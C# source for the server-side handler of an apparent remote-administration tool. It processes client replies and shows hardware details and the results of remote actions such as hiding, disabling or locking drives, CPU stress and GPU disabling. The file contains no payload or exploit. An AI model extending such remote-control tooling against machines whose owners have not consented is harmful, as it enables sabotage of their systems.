using System;
using System.Collections;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerHardware
{
	private const int MaxHwidLength = 128;

	private const int MaxDriveLetterLength = 2;

	private const long MaxByteValue = 549755813888L;

	private static bool IsValidDriveLetter(string s)
	{
		if (string.IsNullOrEmpty(s) || s.Length > 2)
		{
			return false;
		}
		s = s.TrimEnd(':', '\\').Trim();
		if (s.Length != 1)
		{
			return false;
		}
		char c = char.ToUpperInvariant(s[0]);
		if (c >= 'A')
		{
			return c <= 'Z';
		}
		return false;
	}

	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 2 || !(objects[1] is string { Length: <=32 } sub) || sub == null)
		{
			return;
		}
		switch (sub.Length)
		{
		case 7:
			switch (sub[0])
			{
			case 'C':
			{
				if (!(sub == "Connect"))
				{
					if (!(sub == "CpuInfo") || client.Tag == null)
					{
						break;
					}
					FormHardWare fCpu = (FormHardWare)client.Tag;
					fCpu.Invoke((MethodInvoker)delegate
					{
						fCpu.gridCpu.Rows.Clear();
						int num = 2;
						while (num + 3 < objects.Length)
						{
							string text = (objects[num++] ?? "").ToString();
							int num2 = Convert.ToInt32(objects[num++] ?? ((object)0));
							int num3 = Convert.ToInt32(objects[num++] ?? ((object)0));
							int num4 = Convert.ToInt32(objects[num++] ?? ((object)0));
							fCpu.gridCpu.Rows.Add(text, num2.ToString(), num3.ToString(), num4 + " MHz");
						}
						fCpu.materialLabel1.Text = "CPU info loaded";
					});
					break;
				}
				if (objects.Length < 3 || !(objects[2] is string hwid))
				{
					client.Disconnect();
					break;
				}
				string safeHwid = (hwid ?? "").Trim();
				if (safeHwid.Length == 0 || safeHwid.Length > 128)
				{
					client.Disconnect();
					break;
				}
				FormHardWare form = (FormHardWare)Application.OpenForms["Hardware:" + safeHwid];
				if (form == null)
				{
					client.Disconnect();
					break;
				}
				form.Invoke((MethodInvoker)delegate
				{
					form.Text = "Hardware [" + safeHwid + "]";
					form.client = client;
					form.materialLabel1.Text = "Connected";
					form.materialLabel1.Enabled = true;
					form.dataGridView2.Enabled = true;
					form.dataGridView2.Rows.Clear();
				});
				client.Tag = form;
				break;
			}
			case 'G':
			{
				if (!(sub == "GpuInfo") || client.Tag == null)
				{
					break;
				}
				FormHardWare fGpu = (FormHardWare)client.Tag;
				fGpu.Invoke((MethodInvoker)delegate
				{
					fGpu.gridGpu.Rows.Clear();
					int num = 2;
					while (num + 3 < objects.Length)
					{
						string text = (objects[num++] ?? "").ToString();
						string text2 = (objects[num++] ?? "").ToString();
						string text3 = (objects[num++] ?? "").ToString();
						string text4 = (objects[num++] ?? "").ToString();
						fGpu.gridGpu.Rows.Add(text, text2, text3, text4);
					}
					fGpu.materialLabel1.Text = "GPU info loaded";
				});
				break;
			}
			case 'R':
			{
				if (!(sub == "RamInfo") || client.Tag == null)
				{
					break;
				}
				FormHardWare fRam = (FormHardWare)client.Tag;
				fRam.Invoke((MethodInvoker)delegate
				{
					fRam.gridRam.Rows.Clear();
					int num = 2;
					while (num + 3 < objects.Length)
					{
						string text = (objects[num++] ?? "").ToString();
						string text2 = (objects[num++] ?? "").ToString();
						string text3 = (objects[num++] ?? "").ToString();
						string text4 = (objects[num++] ?? "").ToString();
						fRam.gridRam.Rows.Add(text, text2, text3, text4);
					}
					fRam.materialLabel1.Text = "RAM info loaded";
				});
				break;
			}
			}
			break;
		case 16:
			switch (sub[0])
			{
			case 'S':
				if (!(sub == "SetVisibleResult"))
				{
					if (!(sub == "SetEnabledResult") || client.Tag == null || objects.Length < 4)
					{
						break;
					}
					string dl4 = (objects[2] ?? "").ToString();
					if (IsValidDriveLetter(dl4))
					{
						FormHardWare f2e = (FormHardWare)client.Tag;
						bool enabled = Convert.ToBoolean(objects[3]);
						f2e.Invoke((MethodInvoker)delegate
						{
							f2e.materialLabel1.Text = "Drive " + dl4 + " " + (enabled ? "enabled" : "disabled");
						});
					}
				}
				else
				{
					if (client.Tag == null || objects.Length < 4)
					{
						break;
					}
					string dl5 = (objects[2] ?? "").ToString();
					if (!IsValidDriveLetter(dl5))
					{
						break;
					}
					FormHardWare f5 = (FormHardWare)client.Tag;
					bool visible = Convert.ToBoolean(objects[3]);
					f5.Invoke((MethodInvoker)delegate
					{
						foreach (DataGridViewRow dataGridViewRow in (IEnumerable)f5.dataGridView2.Rows)
						{
							if (dataGridViewRow.Cells.Count > 5 && dataGridViewRow.Cells[0].Value != null && dataGridViewRow.Cells[0].Value.ToString().TrimEnd(':') == dl5.TrimEnd(':', '\\'))
							{
								dataGridViewRow.Cells[5].Value = (visible ? "Visible" : "Hidden");
								break;
							}
						}
						f5.materialLabel1.Text = "Drive " + dl5 + " " + (visible ? "visible" : "hidden");
					});
				}
				break;
			case 'G':
				if (sub == "GpuEnabledResult" && client.Tag != null)
				{
					FormHardWare fGe = (FormHardWare)client.Tag;
					bool gpuOn = objects.Length >= 3 && Convert.ToBoolean(objects[2]);
					fGe.Invoke((MethodInvoker)delegate
					{
						fGe.materialLabel1.Text = (gpuOn ? "GPU enabled" : "GPU disabled");
					});
				}
				break;
			}
			break;
		case 15:
			switch (sub[0])
			{
			case 'S':
			{
				if (!(sub == "SetLockedResult") || client.Tag == null || objects.Length < 4)
				{
					break;
				}
				string dl3 = (objects[2] ?? "").ToString();
				if (!IsValidDriveLetter(dl3))
				{
					break;
				}
				FormHardWare f2l = (FormHardWare)client.Tag;
				bool locked = Convert.ToBoolean(objects[3]);
				f2l.Invoke((MethodInvoker)delegate
				{
					f2l.materialLabel1.Text = "Drive " + dl3 + " " + (locked ? "locked (access denied)" : "unlocked");
					foreach (DataGridViewRow dataGridViewRow in (IEnumerable)f2l.dataGridView2.Rows)
					{
						if (dataGridViewRow.Cells.Count > 6 && dataGridViewRow.Cells[0].Value != null && dataGridViewRow.Cells[0].Value.ToString().TrimEnd(':') == dl3.TrimEnd(':', '\\'))
						{
							dataGridViewRow.Cells[6].Value = (locked ? "Locked" : "Unlocked");
							break;
						}
					}
				});
				break;
			}
			case 'C':
				if (sub == "CpuStressResult" && client.Tag != null)
				{
					FormHardWare fCs = (FormHardWare)client.Tag;
					bool stressOn = objects.Length >= 3 && Convert.ToBoolean(objects[2]);
					fCs.Invoke((MethodInvoker)delegate
					{
						fCs.materialLabel1.Text = (stressOn ? "CPU stress started" : "CPU stress stopped");
					});
				}
				break;
			}
			break;
		case 6:
		{
			if (!(sub == "Drives") || client.Tag == null)
			{
				break;
			}
			FormHardWare f4 = (FormHardWare)client.Tag;
			f4.Invoke((MethodInvoker)delegate
			{
				f4.dataGridView2.Rows.Clear();
				f4.materialLabel1.Text = "Drives loaded";
				int num = 2;
				while (num + 5 < objects.Length)
				{
					string text = (objects[num++] ?? "").ToString().Trim();
					if (text.Length > 2)
					{
						num += 6;
					}
					else
					{
						string text2 = (objects[num++] ?? "HDD").ToString();
						if (text2.Length > 16)
						{
							text2 = "HDD";
						}
						long num2 = 0L;
						long num3 = 0L;
						try
						{
							num2 = Convert.ToInt64(objects[num++] ?? ((object)0L));
							if (num2 < 0 || num2 > 549755813888L)
							{
								num2 = 0L;
							}
						}
						catch
						{
							num++;
						}
						try
						{
							num3 = Convert.ToInt64(objects[num++] ?? ((object)0L));
							if (num3 < 0 || num3 > 549755813888L)
							{
								num3 = 0L;
							}
						}
						catch
						{
							num++;
						}
						int num4 = 0;
						try
						{
							num4 = Convert.ToInt32(objects[num++] ?? ((object)0));
							if (num4 < 0 || num4 > 10000000)
							{
								num4 = 0;
							}
						}
						catch
						{
							num++;
						}
						bool flag = false;
						try
						{
							flag = Convert.ToBoolean(objects[num++] ?? ((object)false));
						}
						catch
						{
							num++;
						}
						bool flag2 = false;
						if (num < objects.Length)
						{
							try
							{
								flag2 = Convert.ToBoolean(objects[num++] ?? ((object)false));
							}
							catch
							{
								num++;
							}
						}
						string text3 = FormatBytes(num2);
						string text4 = FormatBytes(num3);
						string text5 = (flag ? "Hidden" : "Visible");
						string text6 = (flag2 ? "Locked" : "Unlocked");
						f4.dataGridView2.Rows.Add(text + ":", text2, text3, text4, num4.ToString(), text5, text6);
					}
				}
			});
			break;
		}
		case 20:
			if (sub == "EnableDisabledResult" && client.Tag != null)
			{
				FormHardWare fEd = (FormHardWare)client.Tag;
				fEd.Invoke((MethodInvoker)delegate
				{
					fEd.materialLabel1.Text = "Disabled disk enabled. List updated.";
				});
			}
			break;
		case 5:
			if (sub == "Error" && client.Tag != null)
			{
				FormHardWare f3 = (FormHardWare)client.Tag;
				string err = ((objects.Length >= 3) ? (objects[2] ?? "") : "").ToString();
				if (err.Length > 2048)
				{
					err = err.Substring(0, 2048);
				}
				f3.Invoke((MethodInvoker)delegate
				{
					f3.materialLabel1.Text = "Error: " + err;
				});
			}
			break;
		case 14:
			if (sub == "ClearRamResult" && client.Tag != null)
			{
				FormHardWare fCr = (FormHardWare)client.Tag;
				fCr.Invoke((MethodInvoker)delegate
				{
					fCr.materialLabel1.Text = "Working set cleared";
				});
			}
			break;
		}
	}

	private static string FormatBytes(long bytes)
	{
		if (bytes <= 0)
		{
			return "0 B";
		}
		string[] units = new string[5] { "B", "KB", "MB", "GB", "TB" };
		int u = 0;
		double v = bytes;
		while (v >= 1024.0 && u < units.Length - 1)
		{
			v /= 1024.0;
			u++;
		}
		return $"{v:F2} {units[u]}";
	}
}
